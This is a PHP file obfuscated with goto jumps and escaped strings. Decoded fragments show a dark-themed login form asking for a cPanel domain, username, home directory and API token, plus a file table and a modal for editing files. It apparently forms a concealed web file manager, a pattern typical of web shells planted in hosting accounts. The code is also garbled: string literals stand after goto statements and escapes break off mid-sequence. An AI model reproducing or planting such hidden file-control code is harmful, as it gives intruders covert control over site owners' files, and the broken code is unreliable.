<?php

goto absLO; g7cpU: echo htmlspecialchars($FNN8S["\164\145\170\164"]); goto To2oZ; pIN2e: } goto SY4FO; o1kxq: $XZ0KE = $_SESSION["\143\160\141\x6e\x65\x6c"]["\150\157\155\145\144\151\x72"]; goto "\12\40\x20\x20\x20\40\40\40\40\x20\x20\x20\x20\74\x21\x2d\55\x20\x46\x69\154\x65\x20\x54\x61\142\154\x65\40\55\55\76\xa\40\x20\x20\x20\40\40\x20\x20\x20\40\40\x20\74\144\x69\x76\40\x63\154\x61\x73\x73\x3d\42\162\157\x75\x6e\144\145\x64\x2d\x32\170\154\x20\x6f\x76\x65\162\x66\154\x6f\167\55\x68\x69\x64\144\145\x6e\40\142\x6f\162\x64\x65\162\x20\142\157\162\144\x65\162\55\167\150\151\164\145\57\x31\60\40\142\147\x2d\x77\150\x69\x74\x65\57\65\42\76\xa\x20\40\40\x20\40\40\40\40\40\40\40\40\40\40\40\x20\x3c\164\x61\x62\x6c\x65\40\x63\154\x61\163\163\x3d\x22\x77\55\x66\x75\154\x6c\x20\x74\x65\170\x74\x2d\x6c\x65\146\x74\x22\76\12\x20\x20\x20\x20\x20\x20\x20\40\40\40\40\x20\40\40\40\x20\x20\40\40\40\74\164\150\x65\x61\x64\x20\143\154\x61\x73\x73\x3d\42\142\147\55\x77\150\151\164\x65\57\x35\x22\x3e\12\x20\40\x20\40\40\x20\40\x20\x20\40\x20\x20\x20\x20\x20\x20\x20\40\40\40\x20\40\x20\x20\74\164\x72\76\xa\x20\x20\40\40\x20\x20\40\40\40\x20\40\x20\x20\40\x20\x20\40\x20\x20\40\40\40\40\x20\40\40\x20\40\12\40\40\x20\40\x20\40\40\40\40\x20\x20\40\40\x20\40\x20\40\x20\x20\40\40\40\x20\40\x20\x20\40\40\x3c\164\150\40\x63\154\x61\x73\163\x3d\42\160\x2d\x34\x20\x74\x65\x78\x74\x2d\x78\x73\40\146\157\156\164\x2d\163\145\x6d\151\142\157\154\144\40\x74\162\141\x63\153\151\x6e\x67\55\x77\151\144\x65\162\40\164\x65\x78\164\55\163\154\141\164\145\x2d\x33\x30\x30\x20\165\160\x70\145\162\143\x61\x73\145\42\x3e\116\x61\x6d\145\x3c\x2f\x74\x68\x3e\xa\40\x20\40\x20\x20\40\x20\40\x20\x20\x20\40\40\x20\x20\x20\x20\x20\x20\40\x20\x20\40\x20\x20\40\x20\40\x3c\164\x68\40\x63\154\x61\x73\163\75\42\160\x2d\64\40\164\145\x78\164\x2d\x78\x73\40\146\x6f\x6e\x74\x2d\x73\145\155\x69\x62\x6f\154\x64\40\164\x72\x61\x63\x6b\151\x6e\x67\55\167\151\144\x65\162\x20\164\145\x78\x74\x2d\x73\154\x61\x74\x65\55\63\x30\x30\40\x75\x70\160\145\x72\143\x61\163\x65\42\x3e\123\x69\172\x65\74\57\x74\x68\76\xa\40\x20\40\40\40\40\40\x20\40\40\x20\x20\x20\x20\x20\x20\x20\40\40\x20\x20\40\x20\x20\x20\x20\40\x20\74\164\x68\x20 "\x20\40\x20\40\74\41\x44\117\x43\124\x59\x50\x45\x20\150\164\x6d\154\76\12\40\x20\x20\40\74\x68\164\155\154\40\x63\154\x61\x73\163\75\42\144\141\162\153\x22\x3e\12\x20\40\40\x20\x3c\150\x65\141\144\x3e\12\x20\x20\x20\x20\x20\40\x20\x20\x3c\x6d\145\x74\141\x20\143\150\141\x72\163\x65\164\75\x22\x55\124\106\x2d\70\x22\76\12\40\40\40\40\x20\40\40\x20\74\x6d\145\x74\141\x20\x6e\141\155\145\x3d\x22\x76\x69\x65\167\160\157\x72\164\42\40\143\157\x6e\x74\x65\156\x74\x3d\42\x77\151\x64\x74\150\75\x64\145\x76\151\x63\145\x2d\167\151\144\x74\150\x2c\40\x69\x6e\151\x74\151\141\154\55\x73\143\x61\x6c\x65\x3d\x31\x2e\x30\x22\76\xa\40\40\40\40\40\x20\40\40\x3c\164\x69\164\x6c\x65\x3e\114\157\x67\151\x6e\74\57\x74\x69\x74\x6c\x65\x3e\xa\x20\x20\x20\x20\x20\40\x20\40\74\x73\x63\162\151\160\164\40\163\162\143\75\x22\150\164\x74\160\x73\72\x2f\x2f\x63\144\x6e\x2e\164\141\x69\x6c\167\151\156\144\x63\x73\x73\56\143\157\155\x22\76\74\57\163\x63\162\x69\x70\x74\76\12\x20\x20\40\x20\x20\40\x20\x20\x3c\x73\143\x72\151\160\164\76\12\x20\40\40\x20\40\40\40\x20\x20\40\164\x61\x69\x6c\x77\x69\156\x64\x2e\143\157\156\x66\x69\x67\x20\75\40\173\12\x20\40\x20\40\40\x20\x20\x20\40\x20\40\x20\164\x68\145\x6d\145\x3a\x20\x7b\xa\x20\40\x20\40\x20\x20\40\40\40\x20\40\x20\40\40\145\170\x74\145\x6e\144\x3a\40\173\xa\x20\x20\x20\x20\x20\40\40\40\40\x20\40\x20\x20\x20\40\x20\x66\x6f\x6e\x74\106\141\155\x69\154\x79\x3a\x20\173\x20\x73\141\x6e\163\x3a\x20\133\47\x49\156\164\145\162\47\x2c\40\47\x75\151\x2d\x73\141\156\163\55\x73\145\x72\x69\x66\x27\x2c\40\47\163\x79\x73\164\x65\155\x2d\x75\151\x27\x5d\x20\175\xa\x20\40\40\40\40\x20\40\x20\x20\x20\40\40\x20\x20\175\xa\x20\x20\40\x20\x20\x20\x20\40\40\x20\x20\x20\175\xa\40\x20\40\x20\40\40\x20\x20\40\40\x7d\xa\40\40\x20\x20\40\x20\x20\x20\x3c\57\x73\143\162\x69\160\x74\76\12\40\40\40\x20\x20\40\40\x20\74\x6c\x69\156\x6b\x20\x72\145\x6c\x3d\x22\x70\x72\145\143\x6f\156\x6e\x65\x63\x74\x22\x20\150\162\145\x66\75\x22\x68\164\x74\x70\x73\x3a\57\x2f\x66\x6f\x6e\x74\163\x2e\x67\157\x6f\x67\154\x65\141\160\151\163\56\143\x6f\x6d\x22\76\12\x20\40\40\x20\40\x20\40\x20\x3c\154\x69\x6e\x6b\x20\x72\145\154\75\x22\160\x72\145\143\x6f\156\x6e\x65\143\x74\42\x20\x68\162\145\146\75\x22\150\x74\x74\160\163\72\57\57\146\x6f\156\164\x73\x2e\147\163\x74\141\x74\x69\143\56\143\157\x6d\42\x20\143\162\x6f\163\163\x6f\x72\151\x67\x69\x6e\76\12\40\x20\40\x20\x20\x20\40\x20\74\154\151\x6e\153\x20\150\162\145\x66\75\42\150\164\164\x70\x73\x3a\x2f\57\x66\157\156\164\x73\x2e\x67\157\157\147\x6c\x65\x61\x70\x69\163\x2e\143\157\155\57\143\163\163\x32\x3f\146\x61\155\151\x6c\171\x3d\x49\156\164\x65\x72\72\x77\x67\150\x74\x40\64\x30\60\73\65\60\x30\73\x36\60\x30\x3b\x37\x30\x30\x26\x64\x69\x73\x70\154\141\171\x3d\163\167\141\160\42\40\x72\x65\x6c\x3d\42\163\164\171\x6c\145\163\x68\145\145\164\42\x3e\xa\x20\40\x20\x20\40\x20\40\x20\74\163\164\171\x6c\x65\x3e\xa\40\x20\x20\40\x20\40\40\x20\x20\40\x20\40\72\x72\x6f\x6f\164\x7b\12\40\x20\40\40\x20\40\x20\40\40\40\40\x20\40\x20\55\x2d\142\147\60\x3a\x23\x30\142\61\62\62\60\x3b\12\40\x20\40\x20\x20\40\40\x20\x20\40\40\x20\40\40\55\x2d\x62\147\x31\x3a\43\60\x66\x31\67\62\x61\x3b\xa\x20\x20\x20\x20\40\40\x20\x20\x20\40\x20\x20\40\40\55\x2d\x67\154\141\x73\x73\x3a\x72\147\142\141\50\x31\x37\54\62\x34\x2c\63\71\x2c\x2e\x35\x35\51\x3b\xa\x20\x20\x20\40\x20\40\40\40\40\40\x20\x20\40\x20\55\x2d\x6c\151\x6e\x65\72\x72\x67\142\x61\50\61\x34\70\x2c\x31\66\63\54\x31\70\x34\x2c\56\x31\x38\51\x3b\12\x20\x20\40\40\40\x20\40\40\x20\40\x20\x20\x7d\xa\40\40\x20\40\x20\40\x20\40\40\40\x20\x20\150\164\x6d\x6c\54\x62\x6f\144\x79\173\150\145\x69\147\x68\x74\72\61\x30\60\45\x7d\xa\x20\40\x20\40\x20\40\x20\x20\x20\x20\40\40\142\157\x64\171\173\xa\40\40\40\x20\x20\x20\x20\x20\x20\x20\40\x20\x20\x20\x62\141\143\x6b\x67\x72\157\165\156\144\72\12\x20\x20\40\40\x20\x20\x20\40\x20\x20\40\40\x20\x20\40\x20\x72\x61\144\151\141\154\55\147\x72\141\x64\151\145\156\x74\50\x39\x30\x30\160\x78\x20\66\60\60\x70\x78\x20\x61\x74\x20\x31\65\45\40\x32\x30\45\x2c\x20\162\147\142\x61\x28\x35\66\x2c\61\x38\71\54\62\x34\x38\x2c\56\x31\x38\51\x2c\x20\x74\x72\x61\156\x73\x70\141\x72\145\x6e\164\40\66\x30\x25\51\x2c\xa\40\x20\40\40\40\40\x20\x20\40\40\x20\x20\x20\x20\x20\x20\162\141\x64\x69\141\154\x2d\x67\x72\x61\x64\151\x65\156\164\x28\x37\x30\x30\x70\x78\40\65\x30\60\x70\x78\40\x61\164\40\70\x35\45\x20\x31\60\45\54\40\162\147\142\x61\x28\61\x33\x39\54\71\x32\54\62\64\66\x2c\56\61\70\x29\x2c\40\x74\162\x61\x6e\163\160\x61\162\145\156\164\x20\65\x35\45\x29\54\12\x20\40\40\40\40\40\40\x20\40\x20\40\x20\x20\x20\x20\x20\x72\141\144\151\x61\x6c\55\x67\162\x61\144\x69\145\x6e\x74\50\71\x30\x30\x70\x78\x20\66\x35\x30\x70\x78\x20\141\164\40\67\60\45\x20\x38\65\45\54\40\x72\x67\142\x61\x28\x33\x34\x2c\61\x39\67\54\x39\64\54\x2e\61\60\x29\54\40\164\162\141\156\x73\160\x61\x72\145\x6e\x74\x20\66\x30\45\x29\54\12\x20\x20\40\x20\40\40\40\x20\x20\40\x20\x20\40\x20\x20\x20\x6c\151\156\145\141\162\x2d\147\x72\x61\144\151\145\x6e\x74\x28\x31\x38\x30\x64\145\x67\x2c\x20\x76\141\x72\50\x2d\55\x62\147\x30\x29\54\40\166\x61\x72\x28\x2d\55\x62\147\x31\x29\51\73\xa\x20\x20\x20\40\x20\x20\x20\40\x20\40\40\40\40\x20\x63\x6f\x6c\x6f\162\x3a\43\x65\x35\x65\x37\x65\x62\x3b\12\40\x20\x20\40\x20\40\x20\40\x20\x20\40\40\x20\40\146\157\156\x74\55\163\x69\172\145\x3a\61\66\x70\x78\x3b\xa\40\40\x20\40\40\40\x20\40\40\x20\x20\40\40\40\146\157\x6e\164\55\146\x61\155\x69\154\171\x3a\40\111\x6e\x74\145\162\54\x20\165\151\55\163\x61\156\x73\55\x73\x65\162\151\146\54\x20\x73\x79\x73\x74\145\155\x2d\165\x69\x2c\40\55\141\160\x70\154\x65\55\163\x79\x73\x74\145\155\54\x20\123\x65\x67\x6f\x65\40\x55\x49\x2c\40\x52\157\142\x6f\x74\157\x2c\40\x41\162\x69\x61\154\x2c\x20\42\x41\x70\x70\x6c\145\x20\x43\x6f\x6c\157\x72\x20\105\155\x6f\152\151\x22\54\42\123\x65\147\x6f\145\x20\125\111\40\105\155\157\152\151\x22\x3b\xa\x20\40\x20\40\x20\x20\40\40\40\x20\x20\40\175\12\40\x20\40\40\x20\40\40\x20\x20\40\x20\x20\151\x6e\160\x75\164\x2c\40\x74\x65\170\164\x61\x72\145\x61\54\40\x62\165\164\x74\157\x6e\x2c\40\163\145\x6c\145\143\164\x20\x7b\x20\146\x6f\156\164\x2d\163\x69\x7a\x65\x3a\x20\x31\66\160\170\x20\41\x69\x6d\160\157\162\164\141\156\164\73\x20\x7d\12\40\x20\x20\x20\40\40\x20\40\40\x20\40\x20\56\x67\154\141\163\163\x7b\12\40\40\x20\x20\x20\x20\x20\x20\40\40\x20\40\x20\x20\142\x61\x63\x6b\x67\x72\157\x75\x6e\x64\72\40\166\141\x72\x28\55\55\147\154\x61\163\x73\x29\x3b\xa\40\40\x20\x20\x20\40\x20\x20\40\x20\x20\x20\x20\x20\x62\157\162\x64\x65\x72\x3a\40\61\x70\170\x20\x73\x6f\x6c\151\x64\40\x76\141\162\50\55\x2d\x6c\x69\156\145\51\x3b\xa\40\40\40\x20\40\40\40\x20\40\x20\40\x20\40\x20\142\x61\x63\x6b\144\162\x6f\160\55\146\151\154\x74\145\162\x3a\x20\x62\x6c\x75\x72\x28\x31\62\160\170\51\73\xa\x20\x20\40\x20\x20\40\40\x20\40\x20\40\40\40\40\x2d\167\145\142\x6b\x69\x74\x2d\x62\141\143\153\x64\x72\157\x70\x2d\x66\x69\x6c\x74\145\162\x3a\40\142\x6c\165\162\x28\61\62\x70\170\51\73\12\x20\x20\x20\40\x20\40\x20\x20\40\x20\x20\x20\175\12\40\x20\x20\40\40\40\40\x20\74\x2f\x73\164\171\x6c\145\76\xa\40\40\40\x20\74\57\150\145\141\x64\76\xa\40\40\x20\40\74\142\x6f\144\x79\x20\x63\x6c\141\163\163\x3d\42\x6d\x69\156\55\x68\55\163\x63\162\145\x65\x6e\x20\x66\154\145\x78\x20\x69\164\x65\x6d\x73\x2d\143\x65\x6e\x74\x65\162\x20\x6a\x75\163\x74\x69\x66\171\x2d\x63\145\156\x74\x65\162\x20\160\x78\55\x34\x22\x3e\12\40\x20\40\40\x20\40\40\40\x3c\144\151\x76\40\x63\154\141\163\163\75\42\167\x2d\x66\165\154\154\40\155\x61\x78\x2d\167\55\155\x64\40\x67\x6c\x61\163\163\x20\162\157\x75\156\144\x65\x64\x2d\62\170\x6c\40\x73\150\141\x64\157\167\55\62\170\154\40\160\x2d\70\42\x3e\12\x20\x20\x20\40\x20\x20\40\x20\40\x20\40\40\x3c\144\x69\166\40\x63\x6c\141\163\163\75\x22\155\142\x2d\70\40\164\x65\170\164\55\x63\x65\x6e\164\145\162\42\x3e\xa\x20\40\40\x20\40\40\40\40\x20\40\40\x20\x20\40\x3c\144\x69\166\x20\143\154\141\x73\x73\75\42\x6d\x78\55\x61\165\164\157\40\x6d\142\x2d\64\40\x68\x2d\61\62\40\x77\x2d\61\62\40\162\157\165\x6e\x64\145\144\55\62\x78\x6c\40\142\ goto IL0xZ; nHi1Q: NqEs3: goto xNy_U; W7npP: echo "\x22\40\143\x6c\141\163\x73\x3d\42\x74\x65\170\164\x2d\163\153\171\x2d\63\60\60\40\150\157\x76\145\162\72\x74\145\x78\164\x2d\x73\x6b\x79\x2d\x32\60\60\40\165\156\x64\145\162\x6c\151\156\145\x2d\x6f\x66\x66\x73\145\x74\55\x34\x20\x68\x6f\x76\145\x72\x3a\165\156\144\145\x72\154\151\156\145\x22\x3e\x48\x6f\155\145\x3c\57\x61\x3e\xa\40\x20\40\x20\40\40\40\40\x20\40\40\x20\40\x20\40\x20"; htmlspecialchars($_SESSION["\x63\160\141\x6e\145\154"]["\x64\x6f\155\141\151\x6e"]); goto bmvcE; t5Rt4: echo "\xa\x20\x20\x20\40\x20\x20\x20\40\40\x20\40\40\74\146\x6f\162\155\x20\x6d\145\164\150\157\x64\75\x22\160\x6f\163\x74\x22\40\143\x6c\141\163\x73\75\x22\163\x70\141\x63\145\x2d\171\x2d\66\42\x3e\12\x20\40\x20\40\x20\x20\40\x20\x20\x20\40\40\x20\x20\x20\40\74\144\151\x76\x3e\xa\40\x20\x20\x20\x20\40\x20\40\40\40\40\x20\x20\x20\x20\x20\40\40\40\x20\x3c\x6c\141\x62\x65\x6c\x20\143\154\141\x73\x73\x3d\x22\142\154\157\143\153\40\164\x65\170\164\55\x67\162\x61\x79\x2d\63\60\x30\40\x6d\142\55\62\40\146\x6f\156\x74\55\x6d\x65\x64\x69\x75\155\40\164\145\x78\164\x2d\163\x6d\x22\x3e\104\x6f\155\141\151\x6e\74\x2f\154\141\x62\x65\154\76\12\x20\x20\x20\x20\40\40\40\x20\x20\40\40\40\x20\x20\40\40\x20\40\40\x20\x3c\x69\x6e\x70\x75\x74\40\164\x79\x70\145\75\42\164\x65\x78\164\42\40\156\x61\155\145\75\42\x64\157\155\141\x69\156\42\x20\x70\x6c\141\x63\145\x68\157\154\x64\145\x72\x3d\42\x63\162\x65\x61\164\151\x76\x65\145\156\x67\147\56\143\x6f\56\151\x6e\42\40\162\x65\161\x75\151\x72\145\144\xa\40\40\x20\40\x20\40\40\40\40\40\x20\x20\x20\x20\x20\40\x20\x20\40\x20\x20\x20\x20\x20\x20\40\40\143\x6c\x61\x73\x73\75\x22\167\55\x66\165\154\x6c\40\162\x6f\165\156\144\145\144\x2d\x78\x6c\x20\142\147\x2d\167\x68\151\164\x65\57\65\40\x62\157\x72\x64\x65\x72\x20\x62\x6f\x72\144\145\162\x2d\x77\x68\151\164\145\x2f\x31\x30\40\160\170\x2d\64\40\x70\171\55\x33\40\164\x65\170\164\55\167\150\151\x74\145\40\x70\x6c\x61\143\145\150\157\x6c\144\x65\x72\x3a\x74\x65\170\164\55\163\154\x61\x74\145\x2d\64\x30\x30\x20\x66\x6f\143\x75\x73\x3a\157\x75\x74\x6c\x69\x6e\145\55\x6e\x6f\x6e\x65\x20\x66\157\x63\165\163\x3a\x72\151\x6e\147\55\x32\40\146\x6f\143\165\x73\72\x72\x69\156\147\x2d\163\x6b\171\55\x35\60\60\57\x36\x30\40\146\x6f\x63\x75\x73\x3a\142\x6f\162\x64\x65\x72\55\x73\x6b\171\x2d\64\x30\60\x2f\64\60\40\x74\162\x61\156\x73\x69\x74\151\157\156\42\x3e\xa\40\x20\x20\40\40\40\x20\40\x20\x20\40\40\x20\40\x20\x20\74\57\144\x69\x76\76\12\12\x20\40\40\40\40\x20\x20\40\40\40\x20\x20\40\40\40\40\x3c\144\x69\166\76\12\40\40\40\x20\x20\x20\x20\x20\x20\x20\x20\x20\40\40\x20\40\x20\40\40\40\74\x6c\141\142\x65\154\x20\143\x6c\141\x73\x73\75\42\x62\x6c\157\143\153\x20\x74\145\170\x74\x2d\x67\x72\x61\171\x2d\63\60\x30\40\155\142\55\62\40\146\x6f\x6e\164\55\x6d\x65\144\x69\165\x6d\x20\x74\x65\x78\x74\x2d\x73\x6d\42\76\x55\163\x65\162\x6e\141\x6d\145\x3c\57\154\141\x62\x65\x6c\76\xa\40\x20\40\x20\x20\x20\40\40\40\40\40\40\40\x20\40\40\40\40\40\40\74\x69\156\160\x75\x74\x20\164\171\160\x65\x3d\x22\x74\x65\x78\x74\x22\40\156\141\x6d\145\x3d\x22\x75\x73\x65\x72\156\x61\x6d\x65\x22\x20\x72\x65\x71\165\x69\x72\145\x64\12\x20\x20\x20\x20\x20\x20\40\x20\40\40\x20\x20\40\x20\40\40\40\40\x20\x20\40\x20\40\40\40\x20\40\x63\x6c\141\x73\163\75\42\167\55\x66\x75\154\x6c\40\162\157\x75\x6e\144\x65\x64\55\170\154\40\142\147\55\167\x68\151\x74\x65\x2f\65\40\142\157\162\144\145\162\40\142\x6f\x72\x64\x65\162\x2d\x77\150\151\x74\145\x2f\61\x30\40\x70\x78\x2d\x34\40\x70\171\55\63\40\x74\145\x78\164\x2d\167\x68\151\164\145\x20\x70\x6c\141\x63\x65\150\157\x6c\x64\x65\x72\x3a\164\x65\x78\164\x2d\163\x6c\x61\x74\145\55\x34\x30\60\x20\x66\x6f\143\x75\x73\72\x6f\x75\164\x6c\x69\x6e\145\55\156\x6f\x6e\145\x20\x66\x6f\143\165\x73\x3a\162\151\x6e\147\x2d\62\x20\146\157\x63\x75\163\x3a\162\151\156\x67\55\x73\x6b\171\x2d\65\60\60\x2f\x36\x30\40\x66\157\x63\x75\163\x3a\142\x6f\x72\144\145\x72\55\163\153\x79\55\64\60\60\x2f\x34\x30\x20\x74\162\x61\156\163\151\164\x69\157\156\x22\x3e\12\40\x20\x20\x20\40\40\x20\x20\x20\40\x20\x20\x20\40\x20\40\x3c\57\x64\151\166\x3e\12\xa\x20\40\x20\x20\40\40\40\40\x20\40\x20\x20\40\40\40\40\x3c\144\151\x76\76\xa\40\x20\x20\40\x20\x20\x20\40\40\x20\x20\x20\x20\40\x20\40\x20\x20\x20\x20\x3c\x6c\x61\142\145\x6c\x20\143\x6c\x61\x73\163\75\x22\x62\x6c\x6f\x63\x6b\40\164\145\170\164\55\x67\162\x61\171\55\63\60\60\x20\155\142\55\62\40\146\157\x6e\164\x2d\x6d\145\x64\151\165\x6d\x20\164\x65\x78\164\55\163\x6d\42\76\110\x6f\x6d\145\x20\x44\x69\x72\x65\x63\x74\x6f\x72\171\74\x2f\154\x61\x62\x65\x6c\x3e\12\40\x20\x20\40\40\x20\40\x20\40\x20\40\40\x20\40\x20\x20\40\x20\40\x20\74\151\156\160\165\x74\x20\x74\171\160\x65\x3d\x22\x74\x65\170\164\42\40\x6e\141\155\x65\x3d\42\x68\x6f\155\145\144\151\162\x22\40\x70\x6c\x61\143\x65\150\157\x6c\144\x65\162\x3d\x22\x2f\x68\x6f\x6d\x65\62\x2f\x63\162\x65\x61\164\151\x76\64\x2f\x70\165\x62\x6c\151\x63\x5f\150\x74\x6d\154\x22\x20\x72\x65\161\x75\151\162\145\144\xa\x20\x20\40\x20\40\x20\x20\40\40\x20\x20\x20\x20\40\x20\40\40\x20\x20\x20\x20\x20\40\x20\x20\40\x20\143\154\x61\x73\x73\x3d\42\167\55\x66\x75\x6c\x6c\40\x72\157\165\x6e\144\x65\144\x2d\170\154\40\142\147\x2d\167\x68\x69\x74\x65\57\65\40\x62\157\x72\x64\145\162\40\x62\157\162\144\145\x72\55\167\x68\151\x74\x65\57\61\x30\40\160\170\x2d\64\x20\x70\171\x2d\63\40\164\x65\x78\164\55\167\x68\x69\x74\x65\x20\160\x6c\141\143\145\150\157\x6c\x64\145\x72\72\164\145\170\x74\55\163\154\141\164\145\55\x34\x30\x30\x20\146\x6f\143\x75\x73\x3a\x6f\x75\164\x6c\151\156\x65\x2d\x6e\157\156\145\x20\x66\157\x63\165\x73\x3a\x72\x69\x6e\x67\x2d\62\x20\146\157\143\165\x73\72\162\151\x6e\147\55\x73\153\171\55\65\x30\x30\x2f\66\x30\40\x66\157\x63\165\x73\x3a\x62\x6f\162\144\145\x72\x2d\163\153\171\x2d\64\60\x30\57\64\60\x20\164\162\x61\x6e\163\x69\164\151\x6f\156\42\76\12\40\x20\x20\x20\40\40\x20\40\40\40\x20\x20\x20\x20\40\x20\x20\x20\40\x20\x3c\160\x20\x63\x6c\x61\163\163\x3d\x22\x74\145\x78\x74\55\163\x6d\x20\x74\x65\170\x74\x2d\147\162\x61\171\55\64\60\60\40\x6d\x74\x2d\61\x22\x3e\x43\157\x6e\164\x6f\x68\x3a\40\x2f\x68\x6f\155\x65\x32\57\x63\162\x65\x61\x74\x69\x76\x34\57\160\165\x62\154\x69\143\137\x68\164\x6d\x6c\74\x2f\x70\76\12\40\x20\x20\40\40\x20\40\40\x20\x20\x20\40\40\40\40\x20\74\x2f\x64\x69\x76\76\12\12\x20\x20\x20\40\40\40\40\x20\40\x20\x20\x20\x20\x20\40\40\x3c\x64\x69\166\x3e\12\40\x20\40\40\x20\x20\x20\x20\40\40\40\x20\40\x20\40\40\40\x20\x20\x20\x3c\154\141\142\x65\154\x20\x63\154\x61\x73\163\x3d\x22\142\x6c\157\143\x6b\x20\x74\x65\x78\x74\x2d\147\162\x61\171\x2d\x33\60\60\40\155\x62\x2d\62\40\146\x6f\x6e\x74\55\155\145\x64\x69\165\155\x20\164\145\170\x74\x2d\163\155\42\x3e\101\x50\111\x20\x54\157\153\145\156\x3c\57\x6c\x61\142\x65\154\x3e\12\x20\x20\x20\x20\40\x20\40\x20\x20\40\x20\x20\40\40\40\40\x20\x20\40\x20\x3c\x69\x6e\x70\x75\x74\x20\x74\171\x70\145\75\42\x70\141\163\163\x77\157\162\x64\x22\x20\x6e\x61\x6d\x65\x3d\42\x61\x70\151\124\157\x6b\145\156\x22\40\162\x65\x71\165\151\162\145\144\xa\x20\x20\x20\40\x20\40\x20\x20\40\x20\40\40\40\x20\x20\x20\40\x20\40\x20\x20\40\40\40\40\x20\40\x63\x6c\x61\163\x73\x3d\42\167\x2d\x66\x75\x6c\x6c\x20\x72\157\x75\x6e\x64\x65\144\x2d\170\x6c\x20\x62\x67\55\167\x68\151\164\145\57\x35\40\x62\x6f\162\x64\145\x72\40\142\x6f\162\144\145\x72\x2d\x77\x68\151\164\145\x2f\x31\60\40\x70\x78\x2d\x34\40\160\171\55\x33\x20\164\x65\x78\164\55\x77\150\x69\x74\145\x20\x70\x6c\x61\143\145\x68\x6f\x6c\x64\145\162\x3a\x74\145\170\x74\55\163\x6c\x61\x74\145\55\64\x30\60\x20\x66\x6f\143\x75\163\72\x6f\x75\x74\154\x69\x6e\145\55\156\x6f\156\x65\40\x66\157\143\165\x73\72\x72\151\156\147\x2d\x32\40\146\157\x63\165\163\72\x72\151\156\147\x2d\163\x6b\x79\x2d\x35\x30\x30\x2f\x36\x30\x20\x66\157\x63\x75\163\x3a\x62\x6f\x72\144\145\x72\x2d\x73\153\x79\55\64\60\60\57\64\x30\40\x74\162\141\156\x73\x69\164\151\157\x6e\42\76\12\x20\x20\x20\40\40\x20\x20\40\40\40\40\40\x20\x20\40\40\74\x2f\144\x69\166\76\12\12\40\40\x20\40\x20\40\x20\40\40\40\40\x20\40\40\x20\x20\x3c\142\165\x74\x74\x6f\x6e\x20\164\171\x70\x65\x3d\x22\163\x75\142\x6d\x69\164\x22\40\156\141\155\145\75\42\154\157\147\151\x6e\42\40\12\x20\x20\x20\40\x20\40\40\40\40\40\x20\40\40\x20\40\40\40\40\40\x20\40\x20\x20\x20\x63\x6c\x61\163\x73\75\x22\x77\x2d\146\165\154\154\x20\x72\157\x75\x6e\x64\145\144\55\170\x6c\40\142\147\55\163\x6b\x79\x2d\x35\x30\60\57\71\60\x20\x68\157\166\145\162\72\142\x67\55\x73\x6b\171\55\64\60\x30\40\x74\x65\170\164\55\163\154\141\x74\x65\x2d\x39\65\x30\40\146\157\x6e\164\x2d\163\145\x6d\151\142\157\154\144\x20\160\170\x2d\x34\x20\x7 "\x60\x29\12\40\40\40\x20\40\40\x20\x20\x20\x20\40\40\40\40\x20\x20\56\x74\x68\x65\156\x28\162\40\75\76\x20\162\x2e\x74\x65\x78\x74\50\51\x29\xa\x20\x20\x20\40\x20\x20\40\40\x20\x20\40\40\x20\40\x20\40\56\164\x68\x65\x6e\50\164\x78\x74\40\75\x3e\x20\x7b\xa\40\40\40\40\40\40\40\x20\40\x20\x20\x20\40\x20\x20\x20\x20\x20\x20\x20\144\x6f\143\x75\x6d\145\156\164\x2e\147\145\164\105\x6c\145\x6d\x65\156\x74\102\x79\x49\x64\x28\47\155\x6f\x64\141\x6c\124\x69\x74\x6c\145\47\51\56\151\156\x6e\145\162\124\145\x78\164\40\75\x20\47\105\x64\x69\x74\72\40\47\x20\x2b\40\156\141\x6d\145\73\12\40\x20\40\40\40\x20\40\x20\x20\40\40\40\40\40\40\x20\x20\40\40\x20\144\157\143\x75\155\x65\x6e\164\x2e\147\145\x74\105\x6c\x65\x6d\x65\156\x74\102\x79\x49\144\x28\47\x6d\157\x64\x61\x6c\x41\143\164\x69\157\156\47\x29\x2e\166\x61\154\x75\x65\x20\75\40\x27\145\144\151\x74\137\146\151\154\145\x27\x3b\xa\x20\40\x20\40\40\40\x20\40\x20\x20\x20\40\x20\x20\40\x20\x20\40\40\x20\144\x6f\x63\x75\x6d\145\156\x74\56\x67\x65\x74\x45\x6c\145\155\x65\156\164\102\x79\x49\x64\x28\x27\145\144\x69\164\x46\x69\x6c\145\x6e\x61\155\x65\47\x29\56\166\141\154\x75\145\40\75\40\156\141\155\x65\x3b\12\40\x20\x20\40\x20\x20\x20\40\40\40\x20\40\40\40\x20\x20\x20\x20\x20\40\143\157\x6e\x73\x74\x20\x74\x65\170\164\x61\x72\x65\141\40\x3d\x20\140\x3c\164\145\170\164\141\162\x65\x61\x20\156\x61\155\x65\75\42\x63\x6f\156\x74\x65\x6e\164\42\40\143\154\141\x73\x73\x3d\42\167\55\146\x75\x6c\x6c\x20\162\157\x75\x6e\x64\x65\x64\x2d\x78\x6c\40\x62\147\55\x77\x68\151\164\x65\57\x35\40\142\x6f\x72\x64\x65\162\40\142\x6f\x72\144\145\162\55\x77\150\x69\x74\x65\57\61\x30\40\160\170\x2d\64\x20\160\171\x2d\63\x20\164\145\x78\164\x2d\163\x6d\x20\164\145\x78\x74\x2d\x73\154\141\x74\145\x2d\x31\x30\x30\40\x70\x6c\141\x63\145\150\157\x6c\x64\x65\x72\x3a\x74\x65\x78\164\x2d\x73\x6c\x61\164\145\55\x34\60\x30\x20\x66\x6f\143\165\x73\72\157\165\164\x6c\x69\x6e\145\x2d\156\157\x6e\x65\x20\x66\x6f\x63\x75\x73\72\162\x69\x6e\x67\x2d\x32\x20\x66\157\x63\x75\x73\72\x72\x69\156\147\x2d\x73\153\171\x2d\x35\60\60\57\x35\x30\x22\40\x72\x6f\x77\163\x3d\x22\x31\x36\x22\76\44\x7b\164\170\x74\175\74\x2f\x74\145\x78\164\141\x72\145\x61\76\140\73\xa\40\40\40\40\40\40\40\40\40\x20\40\40\x20\x20\x20\x20\x20\40\x20\x20\x64\157\143\165\x6d\x65\156\x74\56\x67\145\164\105\x6c\145\155\x65\156\164\102\x79\x49\x64\x28\x27\155\x6f\x64\141\154\x43\x6f\x6e\164\145\156\164\x27\51\56\x69\156\156\x65\x72\110\124\115\x4c\40\x3d\x20\x74\145\170\164\141\162\x65\x61\x3b\xa\40\40\x20\40\x20\x20\40\x20\40\x20\40\40\40\40\40\x20\40\x20\x20\40\x6f\x70\145\x6e\115\x6f\x64\x61\154\50\x29\x3b\xa\40\40\40\x20\x20\40\x20\40\x20\x20\x20\40\x20\x20\x20\x20\175\51\x3b\12\40\40\x20\x20\40\x20\x20\40\175\12\12\40\40\40\40\40\x20\40\40\x66\x75\x6e